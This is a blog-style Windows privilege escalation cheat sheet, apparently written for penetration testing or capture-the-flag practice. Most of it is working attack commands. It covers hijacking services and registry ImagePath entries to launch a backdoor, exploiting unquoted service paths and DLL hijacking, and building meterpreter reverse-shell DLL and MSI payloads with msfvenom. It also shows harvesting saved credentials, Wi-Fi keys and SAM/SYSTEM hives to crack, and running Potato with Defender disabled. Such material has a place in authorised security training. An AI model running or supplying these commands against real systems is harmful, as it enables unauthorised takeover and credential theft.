---
layout: single
title: "Windows privilege escalation cheat sheet"
categories: cheatsheet
toc: true
toc_sticky: true
---

## Privilege Escalation Tools

1. [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
2. [SharpUp](https://github.com/GhostPack/SharpUp)
3. [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)


## Kernel Exploit
1. Find Windows Version with Command systeminfo.
2. Search for exploit.
3. Compile and run.

**Useful tools**
Windows Exploit Suggester: 
```
https://github.com/bitsadmin/wesng
```

**Usage:**
First copy the full output of ```systeminfo``` from remote host and save to local computer.

```bash
git clone https://github.com/bitsadmin/wesng.git
cd wesng
python3 setup.py
./wes.py --update
./wes.py info.txt
```
Now search on google, github or exploit-db for exploits.

Here is Already compilied kernel exploits:
```
https://github.com/SecWiki/windows-kernel-exploits
```


## Exploiting Services
There are Various way to enumerate running services. Services Commands are:


**List all services**
```bat
sc queryex type=service state=all #Command shell
Get-Service #Powershell
```


**Search for a services**
```bat
sc queryex type=service state=all | find /i "SERVICE_NAME: service_name"
Get-Service | Where-Object {$_.Name -like "*service_name*"}
```


**Status of a service**
```bat
sc query service_name
Get-Service service_name
```


**List of running services**
```bat
sc queryex type=service
Get-Service | Where-Object {$_.Status -eq "Running"}
```


**Modifying Service Properities**
```bat
sc config service_name binpath='c:\windows\temp\backdoor.exe'
```


**Start and stop Service**
```bat
net start/stop service_name
```


**Service info With winpeas**
```bat
.\winpeas.exe serviceinfo
```


### Insecure Service Permission
Find suspicious service and check configuration:
```bat
sc qc service_name
```

If the service has ```SERVICE_CHANGE_CONFI``` or ```SERVICE_ALL_ACCESS``` , then we can change it's binary path and restart the service for escalation:
```bat
sc config service_name binpath="c:\windows\temp\backdoor.exe"
net stop service_name
net start service_name
```
....**NOTE: if not able to restart the service then, we may need to restart the windows**


### Unquoted Service Path
Finding Unquoted Service with wmic command:
```bat
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Finding Unquoted service with WinPeas:
```bat
.\winpeas.exe quiet serviceinfo
```

If these command finds path something like:```C:\Program Files\Service Path\Vulnerable Service\service_name.exe``` We can exploit it. Because windows will search the service_name.exe in every directory. So we can name our backdoor ```service_name.exe``` and copy to the writeable directory. **Example:**
```bat
#Test the directory if writeable
echo Test>"C:\Program Files\Service Path\Vulnerable Service\test.txt" #if test.txt is created without any error, good!
copy backdoor.exe "C:\Program Files\Service Path\Vulnerable Service\service_name.exe"
net start service_name
```


### Insecure Registry Permission
If the current can't modify the service directory but has permission to modify it's registry, we can escalate privillege!

**Manually Checking:**
```bat
reg query hklm\System\CurrentControlSet\Services /s /v imagepath

#Try to write to the registry
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a 

#Add Reverse Shell
reg add HKLM\SYSTEM\CurrentControlSet\srevices\service_name /v ImagePath /t REG_EXPAND_SZ /d C:\windows\temp\backdoor.exe /f

#start the service
net start service_name
```
Reference: ```https://book.hacktricks.xyz/windows/windows-local-privilege-escalation```


### Insecure Service Executeable
If we can replace the original binary file, we can replace it with our reverse backdoor(Not so common though)


### DLL Hijacking
If a service or program running as system, missing a dll, and we have write permission to the path where windows search for dll, we can create our own malicious and escalate to higher privillege.

```cmd
#Check Permission
icacls C:\program_directory

#create malicious dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o legimate.dll

#Start the service
net start service_name

#or try to execute the program
```


## Exploiting Startup Program and AlwaysInstallElevated 
If we can modify the startup program,we can replace the original program with ours. 
1. **Startup Program**
Note: These command just copy and paste from ```https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software```

```
wmic startup get caption,command 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul & ^
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
```

```bat
#with winpeas
.\winpeas.exe quiet serviceinfo

#Manually
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

#Replace
copy C:\PrivEsc\backdoor.exe "C:\Program Files\Autorun Program\program.exe"
```


2. **AlwaysInstallElevated**
Using winpeas
```bat
.\winpeas.exe quiet windowscreds
```

Generate MSI package with MSFVENOM:
```bash
msfvenom -p windows\x64\meterpreter\reverse_tcp LHOST=<ip> LPORT=<port> -f msi >backdoor.msi
```
Copy the ```backdoor.msi``` to the remote host and execute:
```bat
msiexec /quiet /qn /i C:\windows\temp\backdoor.msi
```


## Escalatiing With Passwords
We need to search for clear text password in various location.

```bat
cmdkey /list
runas /savecred /user:admin C:\windows\temp\backdoor.exe

#List saved Wifi using
netsh wlan show profile

#To get the clear-text password use
netsh wlan show profile <SSID> key=clear 

#Searching for Configuration Files with keyword passwords
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

#Search with winpeas
.\winPEASany.exe quiet cmd searchfast filesinfo
```


**SAM and System Backup Files**
Try to copy these files to local machine and crack
```
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\SYSTEM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\SYSTEM
```
Tools: ```https://github.com/Neohapsis/creddump7.git``` and Hashcat


**Search Registry for password**
```bat
# Search for passwords inside all the registry 
reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
```


##Escalation with Schedule Task
List all task and see if anything suspicious task is running such as if any script is modfiyable(Powershell script?):
```bat
schtasks /query /fo LIST /v
```

If so we can we can appened our reverse backdoor to that script and wait for shell!


## Exploiting Installed Application
Finding running process
```bat
tasklist /v
.\winpeas.exe quiet processinfo
```

Now search for known exploit!


## HotPotato
Potato Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012. Compiled version: ```https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release```

Command:
```
#windows 7
Potato.exe -ip <local ip> -cmd <command to run> -disable_exhaust true
#windows 10
Potato.exe -ip <local ip> -cmd <cmd to run> -disable_exhaust true -disable_defender true
```
Tutorial for [windows 10](https://www.youtube.com/watch?v=Kan58VeYpb8) 


I will update this documents gradually!

